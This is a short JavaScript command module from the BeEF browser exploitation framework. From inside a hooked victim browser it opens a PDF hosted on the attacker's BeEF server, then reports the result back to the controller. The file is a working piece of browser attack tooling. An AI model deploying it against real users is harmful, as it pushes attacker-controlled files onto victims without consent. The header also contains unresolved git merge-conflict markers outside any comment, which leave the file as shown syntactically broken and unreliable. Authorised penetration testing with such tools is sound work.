//
<<<<<<< HEAD
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	
	var pdf_url =  beef.net.httpproto + '://'+beef.net.host+ ':' + beef.net.port + '/report.pdf';
	window.open( pdf_url, '_blank');

    beef.net.send('<%= @command_url %>', <%= @command_id %>, "Attempted to open PDF in default browser.");
});
